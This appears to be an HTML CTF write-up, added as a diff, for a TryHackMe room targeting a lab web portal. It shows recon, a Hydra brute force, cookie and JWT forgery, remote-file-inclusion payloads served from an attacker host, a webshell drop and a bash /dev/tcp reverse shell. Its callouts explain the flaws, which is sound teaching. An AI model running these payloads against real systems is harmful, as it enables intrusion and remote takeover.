@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Domino — TryHackMe Writeup — CyberMaks</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0b0f14; --bg-2: #0f1419; --bg-3: #141b22; --bg-code: #0d1117;
+      --border: #1e2730; --border-2: #253040;
+      --text: #c8d0da; --text-dim: #6b7a8d; --text-faint: #3a4552;
+      --accent: #4d9de0; --accent-dim: #2d6fa8;
+      --green: #34c759; --yellow: #ff9f0a; --red: #ff453a;
+      --mono: 'DM Mono', monospace; --sans: 'DM Sans', sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.75; -webkit-font-smoothing: antialiased; }
+
+    nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; background: rgba(11,15,20,0.88); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
+    .nav-inner { max-width: 1100px; margin: 0 auto; padding: 0 28px; height: 56px; display: flex; align-items: center; justify-content: space-between; }
+    .nav-brand { font-family: var(--mono); font-size: 13px; color: var(--accent); text-decoration: none; }
+    .nav-links { display: flex; list-style: none; }
+    .nav-links a { font-size: 13px; color: var(--text-dim); text-decoration: none; padding: 6px 16px; border-radius: 4px; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--text); }
+    .nav-links a.active { color: var(--accent); }
+
+    .hero { padding: 96px 28px 56px; max-width: 1100px; margin: 0 auto; border-bottom: 1px solid var(--border); }
+    .hero-meta { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; flex-wrap: wrap; }
+    .badge { font-family: var(--mono); font-size: 10px; padding: 3px 9px; border-radius: 3px; letter-spacing: 0.07em; text-transform: uppercase; }
+    .badge-p { background: rgba(52,199,89,0.08);  color: var(--green);  border: 1px solid rgba(52,199,89,0.2); }
+    .badge-c { background: rgba(77,157,224,0.08); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-d { background: rgba(255,159,10,0.08); color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .hero h1 { font-size: clamp(28px, 5vw, 52px); font-weight: 300; line-height: 1.1; letter-spacing: -0.025em; color: #dce5ef; margin-bottom: 18px; }
+    .hero h1 strong { font-weight: 600; color: #edf2f7; }
+    .hero-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; max-width: 640px; line-height: 1.75; margin-bottom: 36px; border-left: 1px solid var(--border-2); padding-left: 20px; }
+    .hero-info { display: flex; gap: 40px; flex-wrap: wrap; }
+    .info-item { display: flex; flex-direction: column; gap: 4px; }
+    .info-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; }
+    .info-value { font-family: var(--mono); font-size: 12px; color: var(--text-dim); }
+
+    .body-wrap { display: grid; grid-template-columns: 1fr 196px; gap: 64px; max-width: 1100px; margin: 0 auto; padding: 64px 28px 120px; align-items: start; }
+
+    .toc { position: sticky; top: 76px; }
+    .toc-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 14px; }
+    .toc ul { list-style: none; display: flex; flex-direction: column; gap: 1px; }
+    .toc ul a { display: block; font-size: 11px; color: var(--text-dim); text-decoration: none; padding: 5px 8px; border-radius: 3px; border-left: 1px solid transparent; transition: color 0.15s, border-color 0.15s; }
+    .toc ul a:hover { color: var(--accent); border-left-color: var(--accent-dim); }
+
+    .section { margin-bottom: 64px; }
+    .s-num { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 6px; }
+    .section h2 { font-size: 19px; font-weight: 600; color: #dce5ef; letter-spacing: -0.018em; margin-bottom: 18px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+    .section h3 { font-size: 14px; font-weight: 500; color: #b0c0d0; margin: 26px 0 10px; }
+    .section p { font-size: 14px; color: var(--text-dim); line-height: 1.8; margin-bottom: 12px; }
+    .section p strong { color: var(--text); font-weight: 500; }
+
+    .kc-wrap { margin: 24px 0; }
+    .kc-phase { margin-bottom: 10px; }
+    .kc-phase-label { font-family: var(--mono); font-size: 9px; color: var(--text-faint); letter-spacing: 0.14em; text-transform: uppercase; margin-bottom: 6px; }
+    .kc-row { display: flex; align-items: center; gap: 0; flex-wrap: nowrap; overflow-x: auto; }
+    .kc-node { font-family: var(--mono); font-size: 10px; padding: 8px 13px; border-radius: 4px; white-space: nowrap; border: 1px solid; flex-shrink: 0; }
+    .kc-node.recon   { color: var(--accent); background: rgba(77,157,224,0.07);  border-color: rgba(77,157,224,0.25); }
+    .kc-node.creds   { color: var(--yellow); background: rgba(255,159,10,0.07);  border-color: rgba(255,159,10,0.25); }
+    .kc-node.access  { color: var(--green);  background: rgba(52,199,89,0.07);   border-color: rgba(52,199,89,0.25); }
+    .kc-node.exploit { color: var(--red);    background: rgba(255,69,58,0.07);   border-color: rgba(255,69,58,0.25); }
+    .kc-node.end     { color: #fff;          background: rgba(255,69,58,0.18);   border-color: var(--red); font-weight: 600; }
+    .kc-arr { font-size: 11px; color: var(--text-faint); padding: 0 6px; flex-shrink: 0; }
+    .kc-down { text-align: left; padding: 2px 0 2px 20px; font-size: 11px; color: var(--text-faint); }
+    .kc-legend { display: flex; gap: 18px; flex-wrap: wrap; margin-top: 14px; padding-top: 14px; border-top: 1px solid var(--border); }
+    .kc-leg { display: flex; align-items: center; gap: 6px; font-family: var(--mono); font-size: 10px; color: var(--text-faint); }
+    .kc-dot { width: 8px; height: 8px; border-radius: 2px; flex-shrink: 0; }
+
+    pre { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .ph { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .pl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .pd { display: flex; gap: 5px; }
+    .pd span { width: 8px; height: 8px; border-radius: 50%; display: block; }
+    pre code { display: block; padding: 18px; font-family: var(--mono); font-size: 12px; line-height: 1.72; color: #a0b8cc; overflow-x: auto; white-space: pre; }
+    .ck { color: #4a5a6a; font-style: italic; }
+    .ca { color: var(--accent); }
+    .cg { color: var(--green); }
+    .cr { color: var(--red); }
+    .cs { color: #ce9178; }
+    .cy { color: var(--yellow); }
+
+    .callout { padding: 14px 18px; border-radius: 5px; margin: 18px 0; border-left: 2px solid; font-size: 13px; line-height: 1.7; }
+    .blue   { background: rgba(77,157,224,0.05);  border-color: var(--accent); color: #88aacc; }
+    .yellow { background: rgba(255,159,10,0.05);  border-color: var(--yellow); color: #aa8855; }
+    .red    { background: rgba(255,69,58,0.05);   border-color: var(--red);    color: #aa6666; }
+    .green  { background: rgba(52,199,89,0.05);   border-color: var(--green);  color: #66aa77; }
+    .callout strong { color: inherit; font-weight: 600; }
+
+    .shot { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .sh { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .sl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .ss { font-family: var(--mono); font-size: 10px; color: var(--accent); }
+    .shot img { display: block; width: 100%; height: auto; background: var(--bg-3); }
+    .sc { padding: 9px 14px; font-size: 11px; color: var(--text-faint); font-style: italic; border-top: 1px solid var(--border); background: var(--bg-2); }
+
+    .steps { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .step { display: grid; grid-template-columns: 52px 1fr; border-bottom: 1px solid var(--border); }
+    .step:last-child { border-bottom: none; }
+    .sn { display: flex; align-items: center; justify-content: center; background: var(--bg-2); border-right: 1px solid var(--border); font-family: var(--mono); font-size: 10px; color: var(--text-faint); padding: 14px 0; }
+    .sb { padding: 14px 18px; font-size: 13px; color: var(--text-dim); background: var(--bg); line-height: 1.7; }
+    .sb strong { color: var(--text); font-weight: 500; }
+    .sb code { font-family: var(--mono); font-size: 11px; color: var(--accent); background: rgba(77,157,224,0.08); padding: 1px 5px; border-radius: 3px; }
+
+    .flag-row { display: flex; flex-direction: column; gap: 8px; margin: 18px 0; }
+    .flag-item { display: grid; grid-template-columns: 28px 1fr; border: 1px solid var(--border); border-radius: 5px; overflow: hidden; }
+    .flag-num { display: flex; align-items: center; justify-content: center; background: var(--bg-2); border-right: 1px solid var(--border); font-family: var(--mono); font-size: 10px; color: var(--text-faint); }
+    .flag-body { padding: 10px 16px; font-size: 13px; color: var(--text-dim); background: var(--bg); }
+    .flag-body strong { color: var(--text); font-weight: 500; display: block; margin-bottom: 2px; }
+    .flag-body code { font-family: var(--mono); font-size: 11px; color: var(--green); }
+
+    footer { border-top: 1px solid var(--border); padding: 28px; }
+    .footer-inner { max-width: 1100px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+    .footer-copy { font-family: var(--mono); font-size: 11px; color: var(--text-faint); }
+    .footer-links { display: flex; gap: 24px; }
+    .footer-links a { font-family: var(--mono); font-size: 11px; color: var(--text-faint); text-decoration: none; transition: color 0.2s; }
+    .footer-links a:hover { color: var(--text-dim); }
+
+    @media (max-width: 860px) { .body-wrap { grid-template-columns: 1fr; } .toc { display: none; } }
+    @media (max-width: 580px) { .hero, .body-wrap { padding-left: 20px; padding-right: 20px; } .footer-inner { flex-direction: column; gap: 12px; } }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a class="nav-brand" href="../index.html">CyberMaks</a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../methodology.html">Methodology</a></li>
+      <li><a href="../about.html">About</a></li>
+      <li><a href="../index.html#case-studies" class="active">Writeups</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="hero-meta">
+    <span class="badge badge-p">TryHackMe</span>
+    <span class="badge badge-c">Web</span>
+    <span class="badge badge-c">Linux</span>
+    <span class="badge badge-c">PrivEsc</span>
+    <span class="badge badge-d">Medium</span>
+  </div>
+  <h1><strong>Domino</strong></h1>
+  <p class="hero-desc">NexusCorp built a portal. NexusCorp also left the AES key in the frontend JS, commented out JWT signature verification, and ran a root cron on a world-writable script. One bad TODO from Laura in October 2024 — full root compromise. Classic.</p>
+  <div class="hero-info">
+    <div class="info-item"><span class="info-label">Platform</span><span class="info-value">TryHackMe</span></div>
+    <div class="info-item"><span class="info-label">Difficulty</span><span class="info-value">Medium</span></div>
+    <div class="info-item"><span class="info-label">OS</span><span class="info-value">Linux (Ubuntu)</span></div>
+    <div class="info-item"><span class="info-label">Stack</span><span class="info-value">Apache · PHP · MySQL</span></div>
+    <div class="info-item"><span class="info-label">Flags</span><span class="info-value">5 total</span></div>
+    <div class="info-item"><span class="info-label">Room</span><span class="info-value"><a href="https://tryhackme.com/room/domino" target="_blank" rel="noopener" style="color:var(--accent);text-decoration:none;">tryhackme.com/room/domino</a></span></div>
+  </div>
+</header>
+
+<div class="body-wrap">
+<main>
+
+  <!-- 00 KILL CHAIN -->
+  <section class="section" id="killchain">
+    <div class="s-num">00</div>
+    <h2>Kill Chain</h2>
+    <div class="kc-wrap">
+
+      <div class="kc-phase">
+        <div class="kc-phase-label">Phase 1 — Recon &amp; Secret Extraction</div>
+        <div class="kc-row">
+          <span class="kc-node recon">Nmap</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node recon">dirsearch → /backup/</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node creds">app.js — AES key</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node creds">config.enc decrypted</span>
+        </div>
+      </div>
+
+      <div class="kc-down">↓</div>
+
+      <div class="kc-phase">
+        <div class="kc-phase-label">Phase 2 — Initial Access &amp; Session Hijack</div>
+        <div class="kc-row">
+          <span class="kc-node recon">team.php — username enum</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node exploit">Hydra → robert.wilson:$PASS</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node creds">Session cookie forge</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node access">Admin as laura.hayes</span>
+        </div>
+      </div>
+
+      <div class="kc-down">↓</div>
+
+      <div class="kc-phase">
+        <div class="kc-phase-label">Phase 3 — JWT Forgery &amp; RFI/RCE</div>
+        <div class="kc-row">
+          <span class="kc-node exploit">JWT — sig check commented out</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node exploit">files.php + eval() = RFI</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node access">Webshell → www-data</span>
+        </div>
+      </div>
+
+      <div class="kc-down">↓</div>
+
+      <div class="kc-phase">
+        <div class="kc-phase-label">Phase 4 — Lateral Movement &amp; Root</div>
+        <div class="kc-row">
+          <span class="kc-node creds">$PASS — password reuse</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node access">SSH as devops</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node exploit">Writable cron script</span>
+          <span class="kc-arr">→</span>
+          <span class="kc-node end">root</span>
+        </div>
+      </div>
+
+      <div class="kc-legend">
+        <span class="kc-leg"><span class="kc-dot" style="background:rgba(77,157,224,0.5)"></span>Recon</span>
+        <span class="kc-leg"><span class="kc-dot" style="background:rgba(255,159,10,0.5)"></span>Credentials</span>
+        <span class="kc-leg"><span class="kc-dot" style="background:rgba(52,199,89,0.5)"></span>Access</span>
+        <span class="kc-leg"><span class="kc-dot" style="background:rgba(255,69,58,0.5)"></span>Exploitation</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- 01 RECON -->
+  <section class="section" id="recon">
+    <div class="s-num">01</div>
+    <h2>Recon &amp; Enumeration</h2>
+
+    <h3>Port scan</h3>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+sudo nmap -sS -sV -sC 10.49.131.163 -F -T3</code></pre>
+
+    <p>Two ports. Classic.</p>
+
+    <pre><code><div class="ph"><span class="pl">nmap output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cg">22/tcp  open  ssh   OpenSSH 9.6p1</span>
+<span class="cg">80/tcp  open  http  Apache/2.4.58 — NexusCorp Portal</span></code></pre>
+
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">10.49.131.163 — login page</span></div>
+      <img src="domino1.png" alt="NexusCorp Portal login page" loading="lazy" />
+      <div class="sc">NexusCorp Portal. Clean login form. Definitely nothing sensitive in the JS files.</div>
+    </div>
+
+    <h3>Directory enumeration</h3>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+dirsearch -u http://10.49.131.163/</code></pre>
+
+    <p>Three hits worth noting:</p>
+
+    <div class="steps">
+      <div class="step"><div class="sn">/backup/</div><div class="sb"><strong>Directory listing enabled.</strong> Contains <code>config.enc</code> and a <code>README.txt</code> that politely points us to <code>static/app.js</code> for "the decryption key reference". Because why not.</div></div>
+      <div class="step"><div class="sn">/admin/</div><div class="sb"><strong>403</strong> — exists but access denied. We'll be back.</div></div>
+      <div class="step"><div class="sn">/api/</div><div class="sb"><strong>The main attraction.</strong> Houses <code>auth/token.php</code> for JWT issuance and <code>files.php</code> for file reading. More on both shortly.</div></div>
+    </div>
+
+    <div class="callout yellow"><strong>README.txt in /backup/:</strong> <em>"Decryption key reference: see static/app.js (deployment notes)"</em><br/>Laura, you had one job.</div>
+  </section>
+
+  <!-- 02 JS SECRET + AES -->
+  <section class="section" id="aes">
+    <div class="s-num">02</div>
+    <h2>JS Secret Leak &amp; AES Decryption</h2>
+
+    <p>Opening <code>/static/app.js</code> in the browser reveals a TODO comment that never got done:</p>
+
+    <pre><code><div class="ph"><span class="pl">static/app.js</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck">// Configuration (TODO: move to env before prod deployment - laura 2024-10-22)</span>
+const CONFIG = {
+    <span class="ck">// Encryption key for backup config decryption - AES-ECB-128</span>
+    <span class="ck">// Key: N3xusK3y2024!!  (pad to 16 bytes with \x00)</span>
+    _backupKey: <span class="cs">'N3xusK3y2024!!'</span>,
+};</code></pre>
+
+    <p>The AES-ECB-128 key is sitting in the frontend, readable by any browser that opens the page. The encrypted config is waiting in <code>/backup/config.enc</code>. Time to decrypt:</p>
+
+    <pre><code><div class="ph"><span class="pl">python3 — decrypt.py</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+from Crypto.Cipher import AES
+
+key = <span class="cs">b'N3xusK3y2024!!\x00\x00'</span>  <span class="ck"># padded to 16 bytes</span>
+
+with open(<span class="cs">'config.enc'</span>, <span class="cs">'rb'</span>) as f:
+    data = f.read()
+
+cipher = AES.new(key, AES.MODE_ECB)
+decrypted = cipher.decrypt(data)
+
+pad_byte = decrypted[-1]
+if 1 <= pad_byte <= 16:
+    decrypted = decrypted[:-pad_byte]
+
+print(decrypted.decode(<span class="cs">'utf-8'</span>))</code></pre>
+
+    <pre><code><div class="ph"><span class="pl">output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cg">{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}</span></code></pre>
+
+    <div class="callout blue"><strong>Intel extracted:</strong> <code>system_user: devops</code> — there is an active OS-level user named <code>devops</code> on this box. Filing that away for Step 6. It will become very relevant.</div>
+
+    <div class="callout red"><strong>Why ECB is a bad choice here (and everywhere):</strong> AES-ECB encrypts identical 16-byte blocks identically, leaking block-level patterns. But the real issue is simpler — the key lives in the JS that the browser downloads. It doesn't matter how strong the cipher is if the key is in plaintext next to the ciphertext on a public-facing server.</div>
+  </section>
+
+  <!-- 03 HYDRA + SESSION FORGE -->
+  <section class="section" id="sessionforge">
+    <div class="s-num">03</div>
+    <h2>Credential Access &amp; Session Cookie Forge</h2>
+
+    <h3>Username enumeration via team.php</h3>
+
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">/team.php — staff directory</span></div>
+      <img src="domino2.png" alt="NexusCorp team page listing staff members including robert.wilson as DevOps" loading="lazy" />
+      <div class="sc">The team page. robert.wilson is listed as the DevOps engineer. Username confirmed, attack surface identified.</div>
+    </div>
+
+    <p><code>/team.php</code> is an unauthenticated staff directory. It hands us <code>robert.wilson</code> — the DevOps guy. Now we run Hydra against the login form:</p>
+
+    <pre><code><div class="ph"><span class="pl">shell — hydra</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+hydra -l robert.wilson -P ~/Downloads/rockyou.txt 10.49.131.163 \
+  http-post-form <span class="cs">"/index.php:username=^USER^&password=^PASS^:Invalid credentials"</span></code></pre>
+
+    <pre><code><div class="ph"><span class="pl">output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cg">[80][http-post-form] login: robert.wilson   password: $PASS</span></code></pre>
+
+    <p>DevOps. The irony writes itself.</p>
+
+    <h3>Session cookie structure</h3>
+
+    <p>Logging in as robert sets a cookie called <code>nexus_session</code>. Decoding the base64 reveals the structure:</p>
+
+    <pre><code><div class="ph"><span class="pl">cookie — decoded</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+nexus_session = base64(<span class="cs">{"user_id":4,"username":"robert.wilson","role":"user"}</span>).hmac_sha256(payload, APP_SECRET)</code></pre>
+
+    <p>Reading <code>auth.php</code> later via the file API reveals the signing secret. With it in hand, we forge an admin cookie for <code>user_id=1</code> — that's laura.hayes, the admin:</p>
+
+    <pre><code><div class="ph"><span class="pl">python3 — forge_cookie.py</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+import hmac, hashlib, base64, json
+
+secret = <span class="cs">b'$APP_SECRET'</span>
+payload = json.dumps(
+    {<span class="cs">"user_id"</span>: 1, <span class="cs">"username"</span>: <span class="cs">"laura.hayes"</span>, <span class="cs">"role"</span>: <span class="cs">"admin"</span>},
+    separators=(<span class="cs">','</span>, <span class="cs">':'</span>)
+)
+b64 = base64.b64encode(payload.encode()).decode()
+sig = hmac.new(secret, b64.encode(), hashlib.sha256).hexdigest()
+print(f<span class="cs">"{b64}.{sig}"</span>)</code></pre>
+
+    <p>Set the output as <code>nexus_session</code> cookie in the browser. Reload. Instant admin access.</p>
+
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">admin panel — welcome laura.hayes</span></div>
+      <img src="domino4.png" alt="NexusCorp admin panel showing Welcome Laura message, confirming admin access via forged session cookie" loading="lazy" />
+      <div class="sc">Welcome back, Laura. We just walked in through the front door using your keys — which were, technically, in the JS file the whole time.</div>
+    </div>
+
+    <div class="callout green"><strong>Flag 2 captured.</strong></div>
+
+    <div class="callout blue"><strong>Why HMAC alone doesn't help when the key is exposed:</strong> HMAC gives you integrity, not secrecy. If the signing secret is readable from the server (here via the file API we're about to exploit), any attacker can mint valid signatures for any payload they want. The secret must be secret — environment variable, secrets manager, not in PHP source files served by a world-readable API.</div>
+  </section>
+
+  <!-- 04 JWT FORGERY -->
+  <section class="section" id="jwt">
+    <div class="s-num">04</div>
+    <h2>JWT Forgery → File API Access</h2>
+
+    <p>The API at <code>/api/auth/token.php</code> issues JWTs for API access. Inside <code>auth.php</code> there's a comment that is, genuinely, one of the best things I've read in a CTF:</p>
+
+    <pre><code><div class="ph"><span class="pl">auth.php — vulnerable snippet</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck">// Signature check intentionally disabled</span>
+<span class="ck">// if (!hash_equals($parts[2], $expected)) return null;</span></code></pre>
+
+    <p>JWT signature verification is <strong>commented out</strong>. The server accepts any token where the header and payload are valid base64 — it doesn't check whether the signature is real. We forge a token with <code>role: admin</code>:</p>
+
+    <pre><code><div class="ph"><span class="pl">python3 — forge_jwt.py</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+import hmac, hashlib, base64, json, time
+
+def b64url(data):
+    if isinstance(data, str):
+        data = data.encode()
+    return base64.urlsafe_b64encode(data).rstrip(b<span class="cs">'='</span>).decode()
+
+secret = <span class="cs">b'$JWT_SECRET'</span>
+
+header  = b64url(json.dumps({<span class="cs">"alg"</span>: <span class="cs">"HS256"</span>, <span class="cs">"typ"</span>: <span class="cs">"JWT"</span>}, separators=(<span class="cs">','</span>, <span class="cs">':'</span>)))
+payload = b64url(json.dumps({
+    <span class="cs">"sub"</span>: <span class="cs">"robert.wilson"</span>,
+    <span class="cs">"role"</span>: <span class="cs">"admin"</span>,
+    <span class="cs">"iat"</span>: int(time.time()),
+    <span class="cs">"exp"</span>: int(time.time()) + 3600
+}, separators=(<span class="cs">','</span>, <span class="cs">':'</span>)))
+
+msg = f<span class="cs">"{header}.{payload}"</span>
+sig = hmac.new(secret, msg.encode(), hashlib.sha256).digest()
+print(f<span class="cs">"{msg}.{b64url(sig)}"</span>)</code></pre>
+
+    <p>With the admin JWT, <code>/api/files.php?name=</code> becomes our filesystem browser. First thing we read: <code>config.php</code>.</p>
+
+    <div class="shot">
+      <div class="sh"><span class="sl">browser / curl</span><span class="ss">/api/files.php — config.php contents via admin JWT</span></div>
+      <img src="domino3.png" alt="API file endpoint response showing config.php contents with all secrets exposed" loading="lazy" />
+      <div class="sc">The entire config. DB credentials, JWT secret, session signing key — all in one request.</div>
+    </div>
+
+    <pre><code><div class="ph"><span class="pl">config.php — extracted</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+DB_USER:    <span class="cg">app_user</span>
+DB_PASS:    <span class="cy">$PASS</span>
+JWT_SECRET: <span class="cg">$JWT_SECRET</span>
+APP_SECRET: <span class="cg">$APP_SECRET</span></code></pre>
+
+    <div class="callout red"><strong>Two bugs, one catastrophe:</strong> The file API has no path restriction — any filename is valid. Combined with the disabled JWT signature check, any attacker with a browser and a Python script can read arbitrary files from the server's filesystem. This is the architectural equivalent of leaving every door unlocked and also removing the doors.</div>
+  </section>
+
+  <!-- 05 RFI / RCE -->
+  <section class="section" id="rce">
+    <div class="s-num">05</div>
+    <h2>RFI → RCE → Flags 1 &amp; 3</h2>
+
+    <p><code>files.php</code> has one more trick. If the <code>name</code> parameter starts with <code>http://</code>, it fetches the URL and passes it straight to <code>eval()</code>:</p>
+
+    <pre><code><div class="ph"><span class="pl">files.php — vulnerable snippet</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+if (strpos($name, <span class="cs">"http://"</span>) === 0) {
+    $remote = @file_get_contents($name);
+    eval(str_replace(<span class="cs">"&lt;?php"</span>, <span class="cs">""</span>, $remote));
+}</code></pre>
+
+    <p>We host a PHP file on our attack machine and point the API at it. The server fetches it, strips the opening <code>&lt;?php</code> tag, and executes it as PHP. Remote File Inclusion in 2024. Beautiful.</p>
+
+    <h3>Start a listener and serve the payload</h3>
+
+    <pre><code><div class="ph"><span class="pl">shell — attack machine</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+python3 -m http.server 8000</code></pre>
+
+    <h3>Read Flag 3</h3>
+    <pre><code><div class="ph"><span class="pl">flag3.php — hosted locally</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+&lt;?php echo shell_exec(<span class="cs">'cat /opt/flag3.txt'</span>); ?&gt;</code></pre>
+
+    <pre><code><div class="ph"><span class="pl">shell — trigger RFI</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -H <span class="cs">"Authorization: Bearer &lt;JWT&gt;"</span> \
+  <span class="cs">"http://10.49.131.163/api/files.php?name=http://&lt;ATTACKER_IP&gt;:8000/flag3.php"</span></code></pre>
+
+    <h3>Dump the database for Flag 1</h3>
+
+    <pre><code><div class="ph"><span class="pl">query.php — hosted locally</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+&lt;?php
+$pdo = new PDO(<span class="cs">'mysql:host=localhost;dbname=nexusdb'</span>, <span class="cs">'app_user'</span>, <span class="cs">'$PASS'</span>);
+$stmt = $pdo-&gt;query(<span class="cs">'SELECT username, role, notes FROM users'</span>);
+foreach ($stmt-&gt;fetchAll(PDO::FETCH_ASSOC) as $row) {
+    echo $row[<span class="cs">'username'</span>] . <span class="cs">' | '</span> . $row[<span class="cs">'role'</span>] . <span class="cs">' | '</span> . $row[<span class="cs">'notes'</span>] . <span class="cs">"\n"</span>;
+}
+?&gt;</code></pre>
+
+    <pre><code><div class="ph"><span class="pl">output — db dump</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cg">laura.hayes  | admin | THM{...}</span>
+robert.wilson | user  |</code></pre>
+
+    <h3>Drop a persistent webshell</h3>
+
+    <pre><code><div class="ph"><span class="pl">shell.php — hosted locally</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+&lt;?php file_put_contents(<span class="cs">'/var/www/html/shell.php'</span>, <span class="cs">'&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;'</span>); ?&gt;</code></pre>
+
+    <p>Now we have a stable webshell at <code>/shell.php?cmd=</code>. Upgrade to a proper reverse shell:</p>
+
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># listener</span>
+nc -lvnp 4444
+
+<span class="ck"># trigger reverse shell</span>
+curl <span class="cs">"http://10.49.131.163/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/&lt;ATTACKER_IP&gt;/4444+0>%261'"</span></code></pre>
+
+    <p>We are <code>www-data</code>. Not root yet, but we're on the box.</p>
+
+    <div class="callout green"><strong>Flag 1 captured</strong> (from DB via RFI) &nbsp;·&nbsp; <strong>Flag 3 captured</strong> (read via RCE)</div>
+  </section>
+
+  <!-- 06 LATERAL MOVEMENT -->
+  <section class="section" id="lateral">
+    <div class="s-num">06</div>
+    <h2>Password Reuse → devops</h2>
+
+    <p>As <code>www-data</code>, we run <code>pspy64</code> to watch for interesting processes. A root cron fires every minute running <code>/opt/monitoring/health_report.sh</code>. Noted — we'll come back to that.</p>
+
